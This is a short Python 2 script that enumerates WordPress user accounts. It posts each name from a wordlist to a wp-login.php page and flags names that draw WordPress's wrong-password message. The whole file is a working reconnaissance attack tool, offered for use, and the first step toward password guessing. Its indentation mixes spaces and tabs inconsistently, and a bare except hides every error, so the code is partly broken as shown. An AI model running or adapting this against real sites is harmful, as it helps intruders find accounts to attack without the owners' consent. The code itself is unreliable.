import requests,sys

def main():
        
    # no fancy command line parsing here
    if len(sys.argv[1:]) != 2:
        print "Usage: ./wp_user_enum.py [username file] [WP Login Page]"
        print "Example: ./wp_user_enum.py wordlist.txt http://127.0.0.1/wp-login.php"
        sys.exit(0)

	usernames = open(sys.argv[1],'r')
	webaddy = sys.argv[2]
	print 'Calculating Max Usernames'
	maxUserCount = sum(1 for line in open(sys.argv[1],'r'))
	print 'Max User Count: {}'.format(maxUserCount)
	currentCount = 0
	try:
		for name in usernames:
			currentCount = int(currentCount + 1)
			clrName = name.replace('\n','')
			respData = requests.post(webaddy,data={'log':clrName,'pwd':'admin','wp-submit':'Log In','redirect_to':webaddy})
			if "The password you entered for the username" in respData.text:
				print 'Found User: {}'.format(clrName)

	except:
		pass

	print ''
	print 'Complete'

main() 
